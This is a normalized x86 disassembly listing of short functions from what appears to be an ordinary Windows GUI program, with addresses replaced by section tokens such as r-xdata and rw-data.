sub_44a8ce
push [ esp + 0x8 ]
lea eax [ ecx + 0x88 ]
push eax
call sub_44a8e1
retn 0x8
sub_44aaf2
mov ecx [ ecx + 0x80 ]
test ecx ecx
je r-xdata
retn
mov eax [ ecx ]
jmp [ eax + 0x34 ]
sub_44ab02
mov ecx [ ecx + 0x80 ]
mov eax [ ecx ]
jmp [ eax + 0x38 ]
sub_44ab0d
push ebp
mov ebp esp
push [ ebp + 0x18 ]
mov ecx [ ecx + 0x80 ]
push [ ebp + 0x14 ]
mov eax [ ecx ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ eax + 0x2c ]
pop ebp
retn 0x14
sub_44abbf
mov ecx [ ecx + 0x80 ]
test ecx ecx
je r-xdata
push 0x1
pop eax
retn
mov eax [ ecx ]
jmp [ eax + 0x20 ]
sub_44abe8
mov ecx [ ecx + 0x80 ]
push [ esp + 0x4 ]
mov eax [ ecx ]
call [ eax + 0x1c ]
retn 0x4
sub_44abfa
mov ecx [ ecx + 0x80 ]
test ecx ecx
je r-xdata
retn 0x4
mov eax [ ecx ]
push [ esp + 0x4 ]
call [ eax + 0x24 ]
sub_44ac10
mov ecx [ ecx + 0xa8 ]
test ecx ecx
jne r-xdata
mov eax [ ecx ]
push [ esp + 0x4 ]
call [ eax + 0x8 ]
mov ecx [ esp + 0x4 ]
push 0x0
mov eax [ ecx ]
call [ eax ]
jmp r-xdata
retn 0x4
sub_44ac32
mov ecx [ ecx + 0x80 ]
test ecx ecx
je r-xdata
xor eax eax
mov eax [ ecx ]
push [ esp + 0x4 ]
call [ eax + 0x30 ]
jmp r-xdata
retn 0x4
sub_44acdb
mov ecx [ ecx + 0x80 ]
test ecx ecx
jne r-xdata
mov eax [ ecx ]
jmp [ eax + 0x10 ]
xor eax eax
retn
sub_44aced
mov ecx [ ecx + 0x80 ]
push [ esp + 0x4 ]
mov eax [ ecx ]
call [ eax + 0x14 ]
retn 0x4
sub_44af4d
lea eax [ esp + 0xc ]
push 0x1
push eax
push [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_44ae14
retn 0xc
sub_44afe9
cmp [ ecx + 0x3c ] 0x0
je r-xdata
retn
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
sub_44b050
xor eax eax
retn
sub_44ba06
push 0x0
push 0x1
call sub_44b95e
retn
sub_44bf0d
mov eax r--data
retn
sub_44bf8e
push esi
mov esi ecx
call sub_44bfaa
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
pop ecx
sub_44c05d
push 0x1
pop eax
retn
j_sub_44b7c1
jmp sub_44b7c1
sub_44cb75
retn 0x4
sub_44cdbf
retn 0x8
sub_44cdc2
mov eax r--data
retn
sub_44cdc8
cmp [ esp + 0x8 ] 0xa
jb r-xdata
call sub_43e71a
cmp [ esp + 0x8 ] 0x11
ja r-xdata
push 0x3
pop eax
jmp r-xdata
retn 0xc
sub_44ce26
push esi
mov esi ecx
call sub_44ce42
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
pop ecx
sub_44d027
push 0x0
add ecx 0xcc
call sub_44cc26
retn
sub_44d203
mov eax r--data
retn
sub_44d3c4
mov eax [ ecx + 0x8 ]
retn
sub_44d3c8
mov ecx [ esp + 0x4 ]
mov eax [ ecx ]
mov edx [ eax ]
mov [ ecx ] edx
mov eax [ eax + 0x8 ]
retn 0x4
sub_44dc82
mov [ ecx ] r--data
jmp sub_43da87
sub_44dc8d
push esi
mov esi ecx
call sub_44dc82
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
pop ecx
sub_44dd05
push esi
mov esi ecx
call sub_44dd5d
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
pop ecx
sub_44dda9
push [ esp + 0x4 ]
call sub_42dd9c
pop ecx
retn 0x4
sub_44ddb6
push [ esp + 0x8 ]
push [ esp + 0x8 ]
call sub_42fe37
pop ecx
pop ecx
retn 0x8
sub_44dded
push [ esp + 0x4 ]
call sub_42ded6
pop ecx
retn 0x4
sub_44ddfa
mov eax [ ecx + 0x14 ]
retn
sub_44df43
retn
sub_44df6e
mov eax [ ecx ]
jmp [ eax + 0x4c ]
sub_44e02a
push esi
mov esi ecx
call sub_455720
and [ esi + 0x84 ] 0x0
and [ esi + 0x80 ] 0x0
mov [ esi ] r--data
mov eax esi
pop esi
retn
sub_44e04a
push esi
mov esi ecx
call sub_44e066
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
pop ecx
sub_44e1db
push [ esp + 0x8 ]
push [ esp + 0x8 ]
call sub_440ea7
retn 0x8
sub_44e1eb
mov eax r--data
retn
sub_44e22c
mov eax [ esp + 0x4 ]
push 0x1
mov [ ecx + 0x80 ] eax
pop eax
retn 0x4
sub_44e27d
mov eax [ ecx + 0x68 ]
mov [ ecx ] r--data
mov ecx [ eax + 0x70 ]
test ecx ecx
je r-xdata
retn
push 0x0
push 0xffffffff
push eax
call sub_44c53c
sub_44f0e4
xor eax eax
retn 0x4
sub_44f0e9
retn 0x4
sub_44f18b
jmp r-xdata
and [ rw-data ] 0x0
and [ rw-data ] 0x0
mov eax 0x80000000
mov [ rw-data ] eax
mov [ rw-data ] eax
retn
j_sub_44f1b3
jmp sub_44f1b3
sub_44f1f8
mov eax r--data
retn
sub_44f2c0
push esi
mov esi ecx
call sub_44f2dc
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
pop ecx
sub_44f35c
push esi
mov esi ecx
call sub_45357b
add eax 0x1070
push sub_4535ed
mov ecx eax
call sub_45518e
push esi
lea ecx [ eax + 0x8 ]
call sub_454d1e
pop esi
retn
sub_44f380
push esi
mov esi ecx
call sub_45357b
add eax 0x1070
push sub_4535ed
mov ecx eax
call sub_45518e
push esi
lea ecx [ eax + 0x8 ]
call sub_454d31
pop esi
retn
sub_44f465
test ecx ecx
je r-xdata
retn
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
sub_44f471
push esi
mov esi ecx
call sub_43e71a
mov ecx [ esi + 0x68 ]
pop esi
test ecx ecx
je r-xdata
retn 0x4
mov eax [ ecx ]
push [ esp + 0x4 ]
call [ eax + 0x6c ]
sub_44f59b
mov eax [ ecx + 0x8c ]
test eax eax
je r-xdata
xor eax eax
add eax 0x20000
jmp r-xdata
retn 0x8
sub_44fb41
mov eax [ esp + 0x4 ]
push [ eax ]
push eax
call sub_44fb50
retn 0x4
sub_4504a8
push [ esp + 0x8 ]
push [ ecx + 0x1c ]
push 0x3e1
push [ esp + 0x10 ]
call [ PostMessageA@IAT ]
xor eax eax
retn 0x8
sub_450524
mov eax [ ecx + 0x98 ]
test eax eax
je r-xdata
call sub_43e71a
mov ecx eax
call sub_441868
jmp r-xdata
retn 0x4
sub_45053f
call sub_4504c3
test eax eax
je r-xdata
xor eax eax
retn
mov eax [ eax + 0x3c ]
retn
sub_45064a
push esi
mov esi ecx
mov ecx [ esi + 0x68 ]
test ecx ecx
je r-xdata
mov ecx esi
call sub_43e71a
pop esi
retn 0x4
mov eax [ ecx ]
push [ esp + 0x8 ]
call [ eax + 0x78 ]
sub_45093e
test [ ecx + 0x24 ] 0x40
je r-xdata
push [ esp + 0x8 ]
push [ esp + 0x8 ]
push 0x362
push [ ecx + 0x1c ]
call [ SendMessageA@IAT ]
xor eax eax
jmp r-xdata
retn 0x8
sub_450a26
lea eax [ ecx + 0x4c ]
retn 0x8
sub_450a2c
push 0x1
push 0xe801
push [ ecx + 0x1c ]
call sub_43fece
retn
sub_450a6d
push 0x0
push [ esp + 0x8 ]
push 0x362
push [ ecx + 0x1c ]
call [ SendMessageA@IAT ]
retn 0x4
sub_451074
mov eax [ esp + 0x4 ]
or [ ecx + 0xb8 ] 0x1
mov [ ecx + 0xa8 ] eax
retn 0x4
sub_4510f7
mov eax ecx
retn
sub_451261
push esi
mov esi ecx
call sub_43e71a
cmp [ esp + 0x8 ] 0x1
je r-xdata
pop esi
retn 0xc
mov eax [ esi ]
push 0x1
mov ecx esi
call [ eax + 0xc8 ]
sub_451280
cmp [ ecx + 0x98 ] 0x0
je r-xdata
call sub_43e71a
push 0x1
pop eax
jmp r-xdata
retn 0x4
sub_4513b8
push esi
mov esi ecx
call sub_43fcfb
test eax eax
jne r-xdata
pop esi
retn
mov eax [ esi + 0x6c ]
sub_451740
call sub_45357b
xor ecx ecx
cmp [ eax + 0x2c ] ecx
sete cl
mov eax ecx
retn
sub_45175f
call sub_45357b
mov eax [ eax + 0x30 ]
retn
sub_451768
push rw-data
call sub_4479eb
retn
j_sub_451778
jmp sub_451778
sub_451778
push sub_451768
call sub_42d719
pop ecx
mov [ rw-data ] al
retn
sub_451cd2
push rw-data
call sub_4479eb
push rw-data
call sub_4479eb
retn
j_sub_451cec
jmp sub_451cec
sub_451cec
push sub_451cd2
call sub_42d719
pop ecx
mov [ rw-data ] eax
retn
sub_451cfd
mov eax r--data
retn
sub_451d4d
push esi
mov esi ecx
call sub_451ed5
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
pop ecx
sub_452da3
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ecx + 0xc8 ]
mov eax [ eax - 0x8 ]
call sub_43e71a
jmp r-xdata
retn 0x8
sub_452e2d
mov eax sub_452e33
retn
sub_452e33
xor eax eax
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x8
sub_452f16
mov eax r--data
retn
sub_452f4e
mov eax r--data
retn
sub_452f94
push esi
mov esi ecx
call j_sub_43ee41
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
mov ecx rw-data
call sub_4265e3
j_sub_43ee41
jmp sub_43ee41
sub_452fb9
mov eax r--data
retn
sub_452fbf
call sub_452fc9
jmp sub_452fd8
sub_452fc9
push 0x40
push 0x3c
mov ecx rw-data
call sub_4264f0
retn
sub_452fd8
push sub_452fe4
call sub_42d719
pop ecx
retn
sub_452fe4
test [ rw-data ] 0x1
jne r-xdata
retn
or [ rw-data ] 0x1
mov ecx rw-data
jmp sub_426518
sub_453064
push 0x30
call sub_454d77
test eax eax
je r-xdata
xor eax eax
retn
mov [ eax ] r--data
retn
sub_453079
push esi
mov esi ecx
call sub_4552eb
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_454d95
sub_453094
mov eax r--data
retn
sub_45309a
push 0x8
call sub_441e89
test eax eax
pop ecx
je r-xdata
xor eax eax
retn
mov ecx eax
call sub_43c396
retn
sub_4530b1
mov eax r--data
retn
sub_4530dd
push esi
mov esi ecx
call j_sub_43c3bf
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
mov ecx rw-data
call sub_4265e3
j_sub_43c3bf
jmp sub_43c3bf
sub_453102
mov eax r--data
retn
sub_453108
call sub_453112
jmp sub_453121
sub_453112
push 0x40
push 0x8
mov ecx rw-data
call sub_4264f0
retn
sub_453121
push sub_45312d
call sub_42d719
pop ecx
retn
sub_45312d
test [ rw-data ] 0x1
jne r-xdata
retn
or [ rw-data ] 0x1
mov ecx rw-data
jmp sub_426518
sub_453228
mov eax r--data
retn
sub_45322e
mov eax r--data
retn
sub_453234
mov eax r--data
retn
sub_45323a
mov eax r--data
retn
sub_453240
call sub_45324a
jmp sub_45324b
sub_45324a
retn
sub_45324b
push sub_453257
call sub_42d719
pop ecx
retn
sub_453257
mov ecx rw-data
jmp j_sub_45527e
sub_453261
push 0xc
call sub_454d77
test eax eax
je r-xdata
xor eax eax
retn
mov [ eax ] r--data
retn
sub_453276
push esi
mov esi ecx
call sub_45509b
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_454d95
sub_453291
mov eax r--data
retn
sub_453297
mov eax r--data
retn
sub_45329d
mov eax r--data
retn
sub_4532a3
mov eax ecx
or [ eax + 0xd4 ] 0xffffffff
or [ eax + 0x104 ] 0xffffffff
mov [ eax ] r--data
retn
sub_4532ba
push esi
mov esi ecx
call sub_4532d5
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_454d95
sub_453349
push sub_452fff
mov ecx rw-data
call sub_45518e
retn
sub_453359
call sub_453363
jmp sub_453364
sub_453363
retn
sub_453364
push sub_453370
call sub_42d719
pop ecx
retn
sub_453370
mov ecx rw-data
jmp j_sub_455205
j_sub_455205
jmp sub_455205
sub_4533e2
push esi
mov esi ecx
call sub_4533fd
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_454d95
sub_453472
mov eax ecx
and [ eax + 0x8 ] 0x0
and [ eax + 0xc ] 0x0
mov [ eax ] r--data
mov [ eax + 0xc ] 0x54
mov [ eax + 0x28 ] sub_441e6f
retn
sub_453491
push esi
mov esi ecx
call sub_4534ac
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_454d95
sub_45355a
call sub_453564
jmp sub_453565
sub_453564
retn
sub_453565
push sub_453571
call sub_42d719
pop ecx
retn
sub_453571
mov ecx rw-data
jmp j_sub_45527e
sub_4535a1
call sub_45357b
add eax 0x1070
push sub_4535ed
mov ecx eax
call sub_45518e
retn
sub_4535ed
push 0x3c
call sub_454d77
test eax eax
je r-xdata
xor eax eax
retn
mov ecx eax
call sub_453472
retn
sub_45362b
push esi
mov esi ecx
call j_sub_4533fd
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_454d95
j_sub_4533fd
jmp sub_4533fd
sub_453680
mov eax r--data
retn
sub_4536c3
push esi
mov esi ecx
call sub_4536df
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
pop ecx
sub_45371a
push [ esp + 0xc ]
push [ esp + 0xc ]
push 0x0
push [ esp + 0x10 ]
call sub_453730
retn 0xc
sub_4537a0
cmp [ rw-data ] 0x0
je r-xdata
push [ esp + 0x4 ]
call sub_45576c
retn 0x4
mov eax [ ecx + 0x64 ]
mov edx eax
and edx 0xff00
cmp edx 0x8200
jne r-xdata
and ax 0xf07f
mov [ ecx + 0x64 ] eax
sub_453b16
mov eax r--data
retn
sub_453b7d
push esi
mov esi ecx
call sub_453b99
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
pop ecx
sub_453cd0
mov eax r--data
retn
sub_453cd6
mov eax ecx
mov [ eax ] r--data
retn
sub_453cdf
push esi
mov esi ecx
call sub_45b26a
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_454d95
sub_453de4
push esi
mov esi ecx
call sub_45412b
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
pop ecx
sub_453e40
push 0x1
pop eax
retn
sub_453f52
push esi
mov esi ecx
call sub_453f6e
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
pop ecx
sub_4542c7
mov eax r--data
retn
sub_4542cd
call sub_4542d7
jmp sub_4542d8
sub_4542d7
retn
sub_4542d8
push sub_4542e4
call sub_42d719
pop ecx
retn
sub_4542e4
mov ecx rw-data
jmp j_sub_45527e
j_sub_45527e
jmp sub_45527e
sub_4542f3
push esi
mov esi ecx
call sub_45b2ba
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
pop ecx
sub_45437e
mov eax r--data
retn
sub_454384
push 0x4
call sub_454d77
test eax eax
je r-xdata
xor eax eax
retn
mov [ eax ] r--data
retn
sub_454399
push esi
mov esi ecx
call sub_45532c
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_454d95
sub_454624
push [ esp + 0x8 ]
push [ esp + 0x8 ]
call sub_454634
retn 0x8
sub_454706
mov ecx [ ecx + 0x80 ]
jmp sub_4559fd
sub_454711
mov eax r--data
retn
sub_454a8f
mov eax r--data
retn
sub_454a95
mov eax r--data
retn
sub_454a9b
call sub_454aa5
jmp sub_454ab7
sub_454aa5
push 0xf022
push 0x0
mov ecx rw-data
call sub_4261f2
retn
sub_454ab7
push sub_454ac3
call sub_42d719
pop ecx
retn
sub_454ac3
mov ecx rw-data
jmp sub_426238
sub_454acd
mov eax r--data
retn
sub_454ad3
call sub_454add
jmp sub_454aef
sub_454add
push 0xf024
push 0x0
mov ecx rw-data
call sub_42623f
retn
sub_454aef
push sub_454afb
call sub_42d719
pop ecx
retn
sub_454afb
mov ecx rw-data
jmp sub_426285
sub_454b05
push 0x10
call sub_441e89
test eax eax
pop ecx
je r-xdata
xor eax eax
retn
mov ecx eax
call sub_446b68
retn
sub_454b1c
mov eax r--data
retn
sub_454b22
mov eax r--data
retn
sub_454b28
mov eax r--data
retn
sub_454b2e
mov eax r--data
retn
sub_454b34
push 0x8
call sub_441e89
test eax eax
pop ecx
je r-xdata
xor eax eax
retn
mov [ eax ] r--data
and [ eax + 0x4 ] 0x0
retn
sub_454b4e
mov eax r--data
retn
sub_454b54
mov eax r--data
retn
sub_454b5a
mov eax r--data
retn
sub_454b60
mov eax r--data
retn
sub_454b66
mov eax r--data
retn
sub_454b6c
mov eax r--data
retn
sub_454b98
push esi
mov esi ecx
call j_sub_446c9d
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
mov ecx rw-data
call sub_4265e3
j_sub_446c9d
jmp sub_446c9d
sub_454bbd
mov eax r--data
retn
sub_454bc3
mov ecx rw-data
call sub_426554
test eax eax
je r-xdata
xor eax eax
retn
and [ eax + 0x4 ] 0x0
mov [ eax ] r--data
retn
sub_454bdf
push esi
mov esi ecx
call sub_454bff
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
mov ecx rw-data
call sub_4265e3
sub_454bff
mov eax sub_463eec
call sub_42dc88
push ecx
mov [ ebp - 0x10 ] ecx
mov [ ecx ] r--data
and [ ebp - 0x4 ] 0x0
call sub_4477b8
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
sub_454c28
mov eax r--data
retn
sub_454c2e
call sub_454c38
jmp sub_454c47
sub_454c38
push 0x40
push 0x10
mov ecx rw-data
call sub_4264f0
retn
sub_454c47
push sub_454c53
call sub_42d719
pop ecx
retn
sub_454c53
test [ rw-data ] 0x1
jne r-xdata
retn
or [ rw-data ] 0x1
mov ecx rw-data
jmp sub_426518
sub_454c6e
call sub_454c78
jmp sub_454c87
sub_454c78
push 0x40
push 0x8
mov ecx rw-data
call sub_4264f0
retn
sub_454c87
push sub_454c93
call sub_42d719
pop ecx
retn
sub_454c93
test [ rw-data ] 0x2
jne r-xdata
retn
or [ rw-data ] 0x2
mov ecx rw-data
jmp sub_426518
sub_454cae
mov eax r--data
retn
sub_454cb4
call sub_454cbe
jmp sub_454cd0
sub_454cbe
push 0xf023
push 0x0
mov ecx rw-data
call sub_4263ad
retn
sub_454cd0
push sub_454cdc
call sub_42d719
pop ecx
retn
sub_454cdc
mov ecx rw-data
jmp sub_4263f3
sub_454ce6
mov eax r--data
retn
sub_454cec
call sub_454cf6
jmp sub_454d08
sub_454cf6
push 0xf021
push 0x0
mov ecx rw-data
call sub_4263fa
retn
sub_454d08
push sub_454d14
call sub_42d719
pop ecx
retn
sub_454d14
mov ecx rw-data
jmp sub_426440
sub_454d1e
mov edx [ ecx + 0x4 ]
mov eax [ esp + 0x4 ]
push esi
mov esi [ ecx ]
mov [ edx + eax ] esi
mov [ ecx ] eax
pop esi
retn 0x4
sub_454d77
push esi
push [ esp + 0x8 ]
push 0x40
call [ LocalAlloc@IAT ]
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop esi
retn 0x4
call sub_43b7b5
sub_454d95
cmp [ esp + 0x4 ] 0x0
je r-xdata
retn 0x4
push [ esp + 0x4 ]
call [ LocalFree@IAT ]
sub_45509b
retn
sub_45526e
push 0x10
call sub_4556cc
xor edi edi
push edi
push edi
call sub_42dca7
sub_4552a3
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
retn 0x8
push [ esp + 0x8 ]
push [ esp + 0x8 ]
call sub_455135
sub_4552bd
cmp [ rw-data ] 0x0
je r-xdata
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
dec [ rw-data ]
jne r-xdata
retn
call sub_454deb
and [ rw-data ] 0x0
sub_4552e5
mov eax r--data
retn
sub_455362
push sub_453064
mov ecx rw-data
call sub_455223
retn
sub_455372
call sub_45537c
jmp sub_45537d
sub_45537c
retn
sub_45537d
push sub_455389
call sub_42d719
pop ecx
retn
sub_455389
mov ecx rw-data
jmp j_sub_455205
sub_455393
call sub_45539d
jmp sub_45539e
sub_45539d
retn
sub_45539e
push sub_4553aa
call sub_42d719
pop ecx
retn
sub_4553aa
mov ecx rw-data
jmp j_sub_45527e
sub_4553b4
call sub_4553be
jmp sub_4553c8
sub_4553be
mov ecx rw-data
jmp sub_455430
sub_4553c8
push sub_4553d4
call sub_42d719
pop ecx
retn
sub_4553d4
mov ecx rw-data
jmp sub_45b309
sub_45540e
push esi
mov esi [ GetSystemMetrics@IAT ]
push 0x2
call esi
push 0x3
mov [ rw-data ] eax
call esi
and [ rw-data ] 0x0
mov [ rw-data ] eax
pop esi
retn
sub_4554ee
jmp r-xdata
call sub_4554cb
mov [ rw-data ] eax
retn
sub_4554fe
push 0x8
call sub_441e89
test eax eax
pop ecx
je r-xdata
xor eax eax
retn
mov [ eax ] r--data
and [ eax + 0x4 ] 0x0
retn
sub_455518
mov eax r--data
retn
sub_45551e
mov ecx rw-data
call sub_426554
test eax eax
je r-xdata
xor eax eax
retn
and [ eax + 0x4 ] 0x0
mov [ eax ] r--data
retn
sub_45553a
push esi
mov esi ecx
call sub_45555a
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
mov ecx rw-data
call sub_4265e3
sub_45555a
mov eax sub_463fb4
call sub_42dc88
push ecx
mov [ ebp - 0x10 ] ecx
mov [ ecx ] r--data
and [ ebp - 0x4 ] 0x0
call sub_4437b0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
sub_455583
mov eax r--data
retn
sub_455589
call sub_455593
jmp sub_4555a2
sub_455593
push 0x40
push 0x8
mov ecx rw-data
call sub_4264f0
retn
sub_4555a2
push sub_4555ae
call sub_42d719
pop ecx
retn
sub_4555ae
test [ rw-data ] 0x1
jne r-xdata
retn
or [ rw-data ] 0x1
mov ecx rw-data
jmp sub_426518
sub_4556cc
cmp [ rw-data ] 0x0
jne r-xdata
retn 0x4
mov eax [ esp + 0x4 ]
lea eax [ eax + eax * 2 ]
lea eax [ eax * 8 + rw-data ]
push eax
call [ LeaveCriticalSection@IAT ]
sub_4556ed
mov eax r--data
retn
sub_4556f3
push 0x14
call sub_441e89
test eax eax
pop ecx
je r-xdata
xor eax eax
retn
mov ecx eax
call sub_43cf97
retn
sub_45570a
mov eax rw-data
retn
j_sub_455715
jmp sub_455715
sub_455715
push rw-data
call sub_442f32
retn
sub_45580d
retn 0x8
sub_455849
mov eax r--data
retn
sub_45584f
mov eax r--data
retn
sub_45588a
mov eax r--data
retn
sub_455890
mov eax r--data
retn
sub_4559e1
push esi
mov esi ecx
call sub_45b313
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
pop ecx
sub_4560a1
mov eax r--data
retn
sub_4560a7
mov eax r--data
retn
sub_4560ad
mov eax r--data
retn
sub_4560b3
mov eax r--data
retn
sub_4560b9
mov eax r--data
retn
sub_4560bf
mov eax r--data
retn
sub_4560c5
mov eax r--data
retn
sub_4560cb
mov eax r--data
retn
sub_4560d1
mov eax r--data
retn
sub_4560d7
mov eax r--data
retn
sub_4560dd
mov eax r--data
retn
sub_456118
mov eax r--data
retn
sub_45611e
mov eax r--data
retn
sub_4562fa
mov eax r--data
retn
sub_456300
jmp r-xdata
mov ecx rw-data
jmp sub_45630f
sub_4565b0
push esi
mov esi ecx
call sub_45b37e
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
pop ecx
sub_4565eb
mov eax r--data
retn
sub_4565f1
mov eax ecx
mov [ eax ] r--data
retn
sub_4565fa
push esi
mov esi ecx
call sub_456615
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_454d95
sub_456615
mov [ ecx ] r--data
retn
sub_45661c
call sub_456626
jmp sub_456627
sub_456626
retn
sub_456627
push sub_456633
call sub_42d719
pop ecx
retn
sub_456633
mov ecx rw-data
jmp j_sub_45527e
sub_456701
mov eax [ ecx + 0x8 ]
test eax eax
je r-xdata
add ecx 0x4
push ecx
call [ InterlockedIncrement@IAT ]
retn
mov ecx [ eax ]
push eax
call [ ecx + 0x4 ]
retn
sub_456744
mov eax [ ecx + 0x8 ]
test eax eax
je r-xdata
jmp sub_45671a
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
retn
sub_456918
push esi
mov esi ecx
push [ esp + 0x8 ]
push 0x0
call sub_43ddd5
or [ esi + 0x5c ] 0xffffffff
mov eax esi
pop esi
retn 0x4
sub_456930
mov eax [ esp + 0x4 ]
cmp eax 0x1
mov [ ecx + 0x5c ] eax
je r-xdata
retn 0x4
xor ecx ecx
cmp eax 0x2
setne cl
dec ecx
and ecx 0x3
dec ecx
mov eax ecx
sub_4569a2
push esi
mov esi ecx
call sub_4569be
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
pop ecx
sub_4569be
mov [ ecx ] r--data
jmp sub_43da87
sub_456a98
push esi
mov esi ecx
call sub_456ab4
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
pop ecx
sub_456b32
mov eax [ ecx + 0x28 ]
mov edx [ ecx + 0x2c ]
cmp eax edx
jb r-xdata
inc eax
cmp eax edx
mov [ ecx + 0x28 ] eax
sbb eax eax
neg eax
retn
xor eax eax
retn
sub_456b4a
and [ ecx + 0x28 ] 0x0
retn
sub_456b95
mov eax [ esp + 0x4 ]
lea ecx [ eax - 0x34 ]
call sub_456701
retn 0x4
sub_456ba4
mov eax [ esp + 0x4 ]
lea ecx [ eax - 0x34 ]
call sub_456744
retn 0x4
sub_456bb3
push [ esp + 0xc ]
mov eax [ esp + 0x8 ]
push [ esp + 0xc ]
lea ecx [ eax - 0x34 ]
call sub_4568a7
retn 0xc
sub_456c19
mov ecx [ ebp + 0xc ]
call sub_442f87
mov eax r-xdata
retn
sub_456c89
mov ecx [ ebp + 0xc ]
call sub_442f87
mov eax r-xdata
retn
sub_456cb0
mov eax [ esp + 0x4 ]
lea ecx [ eax - 0x34 ]
mov eax [ eax - 0x34 ]
call [ eax + 0x58 ]
xor eax eax
retn 0x4
sub_456d2c
mov ecx [ ebp + 0xc ]
call sub_442f87
mov eax r-xdata
retn
sub_456d3a
call sub_456d4a
test eax eax
je r-xdata
retn
jmp [ OleFlushClipboard@IAT ]
sub_456db6
inc [ ecx + 0x20 ]
retn
sub_456dba
mov eax [ ecx + 0x20 ]
test eax eax
je r-xdata
retn
dec eax
mov [ ecx + 0x20 ] eax
sub_456ed1
mov ecx [ ebp - 0x14 ]
call sub_442f87
mov eax r-xdata
retn
sub_456f4d
mov ecx [ ebp - 0x14 ]
call sub_442f87
mov eax r-xdata
retn
sub_456f5b
mov eax r--data
retn
sub_456f61
mov eax [ esp + 0x4 ]
lea ecx [ eax - 0x3c ]
call sub_456701
retn 0x4
sub_456f70
mov eax [ esp + 0x4 ]
lea ecx [ eax - 0x3c ]
call sub_456744
retn 0x4
sub_456f7f
push [ esp + 0xc ]
mov eax [ esp + 0x8 ]
push [ esp + 0xc ]
lea ecx [ eax - 0x3c ]
call sub_4568a7
retn 0xc
sub_45770e
push esi
mov esi ecx
call sub_4576c3
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
pop ecx
sub_4579f4
mov eax [ esp + 0xc ]
test eax eax
je r-xdata
push [ esp + 0x8 ]
push [ ecx + 0xc ]
push [ esp + 0xc ]
call [ lstrcpynA@IAT ]
push 0x1
pop eax
retn 0xc
and [ eax ] 0x0
sub_457a16
mov eax ecx
and [ eax ] 0x0
mov [ eax + 0x4 ] 0x1
retn
sub_457a23
push esi
mov esi ecx
call sub_457a3c
mov eax [ esp + 0x8 ]
mov [ esi ] eax
mov eax [ esp + 0xc ]
mov [ esi + 0x4 ] eax
pop esi
retn 0x8
sub_457f7d
pop edx
pop eax
pop ecx
add ecx [ esp ]
mov [ ecx ] edx
sub ecx [ esp ]
mov esp ecx
pop ecx
call eax
retn
j_sub_43da87
jmp sub_43da87
sub_4582f5
mov eax ecx
xor ecx ecx
mov [ eax ] 0xe900
mov [ eax + 0x8 ] 0x2
mov [ eax + 0x10 ] sub_458516
mov [ eax + 0x4 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x14 ] ecx
retn
sub_458516
mov ecx [ esp + 0x4 ]
push 0xe900
call sub_441585
